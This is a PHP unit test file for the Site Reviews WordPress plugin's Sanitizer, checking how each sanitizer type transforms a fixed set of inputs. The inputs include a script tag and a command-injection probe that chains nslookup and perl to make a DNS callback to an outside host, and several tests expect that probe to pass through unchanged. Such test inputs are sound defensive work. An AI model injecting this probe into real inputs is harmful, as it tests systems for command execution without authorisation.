<?php

namespace GeminiLabs\SiteReviews\Tests;

use GeminiLabs\SiteReviews\Modules\Sanitizer;
use WP_UnitTestCase;

/**
 * Test case for the Plugin.
 * @group plugin
 */
class SanitizerTest extends WP_UnitTestCase
{
    protected $testValues;

    public function set_up()
    {
        parent::set_up();
        $this->testValues = [
            'a' => '',
            'b' => 'abc',
            'c' => ['1'],
            'd' => ['a' => false],
            'e' => [13],
            'f' => [0],
            'g' => ['1' => 13],
            'h' => (object) ['b' => true],
            'i' => true,
            'j' => false,
            'k' => '<script>var x = 23;</script>',
            'l' => "<h3>This is a\n title!</h3>",
            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'n' => 'June 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#ax+dex(tomorrow) $200 200% @peter',
            't' => 'this is true',
            'u' => 'this is false',
            'v' => 'matt@wordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
        ];
    }

    public function test_sanitize_array()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'array');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => [],
            'b' => [],
            'c' => ['1'],
            'd' => ['a' => false],
            'e' => [13],
            'f' => [0],
            'g' => ['1' => 13],
            'h' => ['b' => true],
            'i' => [],
            'j' => [],
            'k' => [],
            'l' => [],
            'm' => [],
            'n' => [],
            'o' => [],
            'p' => [],
            'q' => [],
            'r' => [],
            's' => [],
            't' => [],
            'u' => [],
            'v' => [],
            'w' => [],
            'x' => [],
            'y' => [],
            'z' => [],
        ]);
    }

    public function test_sanitize_array_int()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'array-int');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => [],
            'b' => [],
            'c' => [1],
            'd' => [],
            'e' => [13],
            'f' => [],
            'g' => [13],
            'h' => [],
            'i' => [1],
            'j' => [],
            'k' => [],
            'l' => [],
            'm' => [],
            'n' => [1989],
            'o' => [],
            'p' => [],
            'q' => [2020],
            'r' => [],
            's' => [],
            't' => [],
            'u' => [],
            'v' => [],
            'w' => [],
            'x' => [],
            'y' => [],
            'z' => [],
        ]);
    }

    public function test_sanitize_array_string()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'array-string');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => [],
            'b' => ['abc'],
            'c' => ['1'],
            'd' => [],
            'e' => [],
            'f' => [],
            'g' => [],
            'h' => [],
            'i' => ['1'],
            'j' => [],
            'k' => [''],
            'l' => ['This is a title!'],
            'm' => [";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))"],
            'n' => ['June 13', '1989'],
            'o' => ['03-12-2020'],
            'p' => ['0-0-2020'],
            'q' => ['2020'],
            'r' => ['xx xx'],
            's' => ['#ax+dex(tomorrow) $200 200% @peter'],
            't' => ['this is true'],
            'u' => ['this is false'],
            'v' => ['matt@wordpress.org'],
            'w' => ['https//wordpress.org'],
            'x' => ['wordpress.org'],
            'y' => ['www.wordpress.org'],
            'z' => ['https://wordpress.org'],
        ]);
    }

    public function test_sanitize_bool()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'bool');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => false,
            'b' => false,
            'c' => false,
            'd' => false,
            'e' => false,
            'f' => false,
            'g' => false,
            'h' => false,
            'i' => true,
            'j' => false,
            'k' => false,
            'l' => false,
            'm' => false,
            'n' => false,
            'o' => false,
            'p' => false,
            'q' => false,
            'r' => false,
            's' => false,
            't' => false,
            'u' => false,
            'v' => false,
            'w' => false,
            'x' => false,
            'y' => false,
            'z' => false,
        ]);
    }

    public function test_sanitize_date()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'date');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => '',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '1989-06-13 00:00:00',
            'o' => '2020-12-03 00:00:00',
            'p' => '2019-11-30 00:00:00',
            'q' => wp_date('Y-m-d H:i:s', strtotime('2020')),
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => '',
            'w' => '',
            'x' => '',
            'y' => '',
            'z' => '',
        ]);
    }

    public function test_sanitize_email()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'email');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => '',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '',
            'o' => '',
            'p' => '',
            'q' => '',
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => 'matt@wordpress.org',
            'w' => '',
            'x' => '',
            'y' => '',
            'z' => '',
        ]);
    }

    public function test_sanitize_id()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'id');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $pattern = '/glsr_([a-z0-9]{8})/';
        $this->assertMatchesRegularExpression($pattern, $sanitized['a']);
        $this->assertEquals($sanitized['b'], 'abc');
        $this->assertEquals($sanitized['c'], '1');
        $this->assertMatchesRegularExpression($pattern, $sanitized['d']);
        $this->assertEquals($sanitized['e'], '13');
        $this->assertMatchesRegularExpression($pattern, $sanitized['f']);
        $this->assertEquals($sanitized['g'], '13');
        $this->assertMatchesRegularExpression($pattern, $sanitized['h']);
        $this->assertEquals($sanitized['i'], '1');
        $this->assertMatchesRegularExpression($pattern, $sanitized['j']);
        $this->assertEquals($sanitized['l'], 'thisisatitle');
        $this->assertEquals($sanitized['m'], 'nslookuphit-gx_wgukmocpc5c8ddddc');
        $this->assertEquals($sanitized['n'], 'june131989');
        $this->assertEquals($sanitized['o'], '03-12-2020');
        $this->assertEquals($sanitized['p'], '0-0-2020');
        $this->assertEquals($sanitized['q'], '2020');
        $this->assertEquals($sanitized['r'], 'xxxx');
        $this->assertEquals($sanitized['s'], 'axdextomorrow200200peter');
        $this->assertEquals($sanitized['t'], 'thisistrue');
        $this->assertEquals($sanitized['u'], 'thisisfalse');
        $this->assertEquals($sanitized['v'], 'mattwordpressorg');
        $this->assertEquals($sanitized['w'], 'httpswordpressorg');
        $this->assertEquals($sanitized['x'], 'wordpressorg');
        $this->assertEquals($sanitized['y'], 'wwwwordpressorg');
        $this->assertEquals($sanitized['z'], 'httpswordpressorg');
    }

    public function test_sanitize_int()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'int');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => 0,
            'b' => 0,
            'c' => 0,
            'd' => 0,
            'e' => 0,
            'f' => 0,
            'g' => 0,
            'h' => 0,
            'i' => 1,
            'j' => 0,
            'k' => 0,
            'l' => 0,
            'm' => 0,
            'n' => 0,
            'o' => 0,
            'p' => 0,
            'q' => 2020,
            'r' => 0,
            's' => 0,
            't' => 0,
            'u' => 0,
            'v' => 0,
            'w' => 0,
            'x' => 0,
            'y' => 0,
            'z' => 0,
        ]);
    }

    public function test_sanitize_numeric()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'numeric');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => '',
            'c' => '',
            'd' => '',
            'e' => '',
            'f' => '',
            'g' => '',
            'h' => '',
            'i' => '',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '',
            'o' => '',
            'p' => '',
            'q' => 2020,
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => '',
            'w' => '',
            'x' => '',
            'y' => '',
            'z' => '',
        ]);
    }

    public function test_sanitize_key()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'key');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => 'thisisatitle',
            'm' => 'nslookuphit_gx_wgukmocpc5c8ddddc',
            'n' => 'june131989',
            'o' => '03_12_2020',
            'p' => '0_0_2020',
            'q' => '2020',
            'r' => 'xxxx',
            's' => 'axdextomorrow200200peter',
            't' => 'thisistrue',
            'u' => 'thisisfalse',
            'v' => 'mattwordpressorg',
            'w' => 'httpswordpressorg',
            'x' => 'wordpressorg',
            'y' => 'wwwwordpressorg',
            'z' => 'httpswordpressorg',
        ]);
    }

    public function test_sanitize_rating()
    {
        add_filter('site-reviews/const/MAX_RATING', function () { return 5; });
        add_filter('site-reviews/const/MIN_RATING', '__return_zero');
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'rating');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => 0,
            'b' => 0,
            'c' => 0,
            'd' => 0,
            'e' => 0,
            'f' => 0,
            'g' => 0,
            'h' => 0,
            'i' => 1,
            'j' => 0,
            'k' => 0,
            'l' => 0,
            'm' => 0,
            'n' => 0,
            'o' => 0,
            'p' => 0,
            'q' => 5,
            'r' => 0,
            's' => 0,
            't' => 0,
            'u' => 0,
            'v' => 0,
            'w' => 0,
            'x' => 0,
            'y' => 0,
            'z' => 0,
        ]);
    }

    public function test_sanitize_slug()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'slug');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => 'this-is-a-title',
            'm' => 'nslookup-hit-gx_wgukmocpc5c8dddd-comperl-e-gethostbynamehissstgxwgukmocpc5c80-me',
            'n' => 'june-13-1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx-xx',
            's' => 'axdextomorrow-200-200-peter',
            't' => 'this-is-true',
            'u' => 'this-is-false',
            'v' => 'mattwordpress-org',
            'w' => 'https-wordpress-org',
            'x' => 'wordpress-org',
            'y' => 'www-wordpress-org',
            'z' => 'https-wordpress-org',
        ]);
    }

    public function test_sanitize_text()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'text');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => 'This is a title!',
            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'n' => 'June 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#ax+dex(tomorrow) $200 200% @peter',
            't' => 'this is true',
            'u' => 'this is false',
            'v' => 'matt@wordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
        ]);
    }

    public function test_sanitize_text_multiline()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'text-multiline');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'abc',
            'c' => '1',
            'd' => '',
            'e' => '13',
            'f' => '0',
            'g' => '13',
            'h' => '',
            'i' => '1',
            'j' => '',
            'k' => '',
            'l' => "This is a\n title!",
            'm' => ";(nslookup hit-gx_wgukmocpc5c8dddd.com||perl -e gethostbyname('hissstgxwgukmocpc5c80.me'))",
            'n' => 'June 13, 1989',
            'o' => '03-12-2020',
            'p' => '0-0-2020',
            'q' => '2020',
            'r' => 'xx xx',
            's' => '#ax+dex(tomorrow) $200 200% @peter',
            't' => 'this is true',
            'u' => 'this is false',
            'v' => 'matt@wordpress.org',
            'w' => 'https//wordpress.org',
            'x' => 'wordpress.org',
            'y' => 'www.wordpress.org',
            'z' => 'https://wordpress.org',
        ]);
    }

    public function test_sanitize_url()
    {
        $sanitizers = array_fill_keys(array_keys($this->testValues), 'url');
        $sanitized = $this->sanitize($this->testValues, $sanitizers);
        $this->assertEquals($sanitized, [
            'a' => '',
            'b' => 'https://abc',
            'c' => 'https://1',
            'd' => '',
            'e' => 'https://13',
            'f' => 'https://0',
            'g' => 'https://13',
            'h' => '',
            'i' => 'https://1',
            'j' => '',
            'k' => '',
            'l' => '',
            'm' => '',
            'n' => '',
            'o' => 'https://03-12-2020',
            'p' => 'https://0-0-2020',
            'q' => 'https://2020',
            'r' => '',
            's' => '',
            't' => '',
            'u' => '',
            'v' => 'https://matt@wordpress.org',
            'w' => 'https://https//wordpress.org',
            'x' => 'https://wordpress.org',
            'y' => 'https://www.wordpress.org',
            'z' => 'https://wordpress.org',
        ]);
    }

    protected function sanitize(array $args, array $sanitizers = [])
    {
        return (new Sanitizer($args, $sanitizers))->run();
    }
}
